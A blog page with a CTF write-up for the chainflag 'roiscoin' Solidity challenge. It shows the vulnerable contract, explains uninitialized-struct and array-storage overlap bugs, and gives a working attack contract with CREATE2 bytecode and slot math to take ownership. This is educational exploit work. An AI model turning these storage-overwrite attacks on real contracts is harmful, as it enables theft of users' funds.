@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      14.storage(roiscoin) 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">14.storage(roiscoin)</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-27 15:04:21
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                    <b>#</b> 02.chainflag ctf
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="storage-roiscoin"><a href="#storage-roiscoin" class="headerlink" title="storage(roiscoin)"></a>storage(roiscoin)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract FakeOwnerGame &#123;</span><br><span class="line">    event SendFlag(address _addr);</span><br><span class="line">    </span><br><span class="line">    uint randomNumber = 0; //0</span><br><span class="line">    uint time = now; //1</span><br><span class="line">    mapping (address =&gt; uint) public BalanceOf;//2</span><br><span class="line">    mapping (address =&gt; uint) public WinCount;//3</span><br><span class="line">    mapping (address =&gt; uint) public FailCount;//4</span><br><span class="line">    bytes32[] public codex;//5</span><br><span class="line">    address private owner;//6</span><br><span class="line">    uint256 settlementBlockNumber;//7</span><br><span class="line">    address guesser;//8</span><br><span class="line">    uint8 guess;//8</span><br><span class="line">    </span><br><span class="line">    struct FailedLog &#123;</span><br><span class="line">        uint failtag;</span><br><span class="line">        uint failtime;</span><br><span class="line">        uint success_count;</span><br><span class="line">        address origin;</span><br><span class="line">        uint fail_count;</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        address msgsender;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address =&gt; FailedLog[]) FailedLogs;//9</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag() onlyOwner &#123;</span><br><span class="line">        require(BalanceOf[msg.sender] &gt;= 2000);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2;</span><br><span class="line"></span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            WinCount[msg.sender] += 1;</span><br><span class="line">            BalanceOf[msg.sender] += 1000;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FailCount[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (WinCount[msg.sender] == 2) &#123;</span><br><span class="line">            if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123;</span><br><span class="line">                guesser = 0;</span><br><span class="line">                WinCount[msg.sender] = 0;</span><br><span class="line">                FailCount[msg.sender] = 0;</span><br><span class="line">                msg.sender.transfer(address(this).balance);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                FailedLog failedlog;</span><br><span class="line">                failedlog.failtag = 1; //randomNumber</span><br><span class="line">                failedlog.failtime = now; //time </span><br><span class="line">                failedlog.success_count = WinCount[msg.sender]; //BalanceOf</span><br><span class="line">                failedlog.origin = tx.origin; //WinCount</span><br><span class="line">                failedlog.fail_count = FailCount[msg.sender]; // FiilCount array&#x27;s length=1</span><br><span class="line">                failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender]));//codex</span><br><span class="line">                failedlog.msgsender = msg.sender; //codex</span><br><span class="line">                FailedLogs[msg.sender].push(failedlog);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function beOwner() payable &#123;</span><br><span class="line">        require(address(this).balance &gt; 0);</span><br><span class="line">        if(msg.value &gt; address(this).balance)&#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;//cheat: msg.value never greater than address(this).balance</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint idx, bytes32 tmp) &#123;</span><br><span class="line">        if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123;</span><br><span class="line">            codex[idx] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><ul>
+<li>goal<ul>
+<li>be the owner</li>
+<li>get 2000 points of <code>BalanceOf()</code></li>
+</ul>
+</li>
+<li>vulnerability<ul>
+<li>settle(): Uninitialized <code>struct</code> pointer</li>
+<li>revise(): <code>CREATE2</code> and EVM’s storage</li>
+</ul>
+</li>
+<li>idea<ol>
+<li>cal the position of codex’s element. Because we can modify the content of slot by <code>revise()</code></li>
+<li>cal the length we need to overlap the slot 6 ( owner )</li>
+<li>modify the length of <code>codex</code> </li>
+<li>call the <code>revise()</code> to be the owner</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.12;</span><br><span class="line">// pay attention to the compiler&#x27;s version!</span><br><span class="line">// CREATE2 doesn&#x27;t in low version, it was added in 0.5.0</span><br><span class="line"></span><br><span class="line">interface IFakeOwnerGame&#123;</span><br><span class="line">    function revise(uint idx, bytes32 tmp)external;</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">    function payforflag()external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    IFakeOwnerGame public level;</span><br><span class="line">    // 3.set the instance</span><br><span class="line">    function step01_setAddr(address _level) public &#123;</span><br><span class="line">        level = IFakeOwnerGame(_level);</span><br><span class="line">    &#125;</span><br><span class="line">    // 4.lock a number: 0, with 1 ether</span><br><span class="line">    function step02_setGuess(uint8 _x) public payable&#123;</span><br><span class="line">        level.lockInGuess.value(1 ether)(_x);</span><br><span class="line">    &#125;</span><br><span class="line">    // 5.call this func until BalanceOf equals to 2000 and WinCount equals to 2</span><br><span class="line">    function step03_settleUntil2Points()public&#123;</span><br><span class="line">        level.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    // 6.cal the _slot and call it with _value(your address)</span><br><span class="line">    // _slot = 0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256(need)</span><br><span class="line">    // _value = 0x000000000000000000000000FFCf0a1D3705222F984f0Df3b220A8C70162e061(be the owner)</span><br><span class="line">    function step04_modifyOwnerSlot(uint256 _slot,bytes32 _value)public&#123;</span><br><span class="line">        level.revise(_slot,_value);</span><br><span class="line">    &#125;   </span><br><span class="line">    // 7.successfully</span><br><span class="line">    function step05_complete()public&#123;</span><br><span class="line">        level.payforflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract deployer&#123;</span><br><span class="line">    // 0.pay attention to the compiler&#x27;s version!</span><br><span class="line">    // CREATE2 doesn&#x27;t in low version, it was added in 0.5.0</span><br><span class="line"></span><br><span class="line">    // 2.deploy and get a specify contract: prefix:&#x27;ff&#x27; and suffix：&#x27;61&#x27;</span><br><span class="line">    bytes attackByteCode = hex&quot;608060405234801561001057600080fd5b50610462806100206000396000f3fe6080604052600436106100555760003560e01c806309773e951461005a57806363ab9a14146100ab5780636fd5ae15146100c2578063883b274a14610103578063dd9fbd9014610148578063f2b0f8191461015f575b600080fd5b34801561006657600080fd5b506100a96004803603602081101561007d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610190565b005b3480156100b757600080fd5b506100c06101d3565b005b3480156100ce57600080fd5b506100d7610255565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010f57600080fd5b506101466004803603604081101561012657600080fd5b810190808035906020019092919080359060200190929190505050610279565b005b34801561015457600080fd5b5061015d610310565b005b61018e6004803603602081101561017557600080fd5b81019080803560ff169060200190929190505050610392565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166380e10aa56040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023b57600080fd5b505af115801561024f573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630339f30083836040518363ffffffff1660e01b81526004018083815260200182815260200192505050600060405180830381600087803b1580156102f457600080fd5b505af1158015610308573d6000803e3d6000fd5b505050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561037857600080fd5b505af115801561038c573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632c0e0054670de0b6b3a7640000836040518363ffffffff1660e01b8152600401808260ff1681526020019150506000604051808303818588803b15801561041057600080fd5b505af1158015610424573d6000803e3d6000fd5b50505050505056fea2646970667358221220109dc61c8e70cdbf2515f6335b5a74d40e28d5f1c8e49489d784b1d0956d28f664736f6c634300060c0033&quot;;</span><br><span class="line">    function deploy(bytes32 _salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackByteCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    // 1.get the hash and cal the salt</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackByteCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract cal&#123;</span><br><span class="line">    // codex&#x27;s element: keccak256(5)</span><br><span class="line">    // result: 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3db0</span><br><span class="line">    function getDyArr(uint256 x) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(abi.encode(x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // cal the codex&#x27;s length that we need to overlap the slot 6(owner)</span><br><span class="line">    function lengthNeed() public pure returns(uint256)&#123;</span><br><span class="line">        uint256 DyArrBegin = uint256(getDyArr(5));</span><br><span class="line">        uint256 slot = 6;</span><br><span class="line">        uint256 lengthNeed = type(uint256).max - DyArrBegin +slot + 1;</span><br><span class="line">        return lengthNeed;</span><br><span class="line">        // need=  114245411204874937970903528273105092893277201882823832116766311725579567940182</span><br><span class="line">        // need=  0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256</span><br><span class="line">        // so the length we modify should greater than &#x27;need&#x27;, we can make the length whose prefix is &#x27;ff&#x27;</span><br><span class="line">        // of course, the suffix must be 61. ====&gt; CREATE2======&gt;so the slot 5(codex) can be this:</span><br><span class="line">        // length=115705583536238263701547016040993257322946596763381008814291318654012181268882</span><br><span class="line">        // length=0xffcf0a1d3705222f984f0df3b220a8c70162e061a66cc928b5edb82af9bd4992</span><br><span class="line">        // (length &gt; need) ===&gt; enough</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/02.chainflag%20ctf/14.storage(roiscoin)/14.storage(roiscoin" alt="codex">/codex.png)</p>
+<h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/06/26/02.chainflag%20ctf/13.storage(rise)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-27 15:04:21
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                        <b>#</b> 02.chainflag ctf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#storage-roiscoin"><span class="toc-text">storage(roiscoin)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#contract"><span class="toc-text">contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analyses"><span class="toc-text">analyses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solve"><span class="toc-text">solve</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 14.storage(roiscoin) + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F27%2F02.chainflag%2520ctf%2F14.storage(roiscoin)%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/27/02.chainflag%20ctf/14.storage(roiscoin)/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
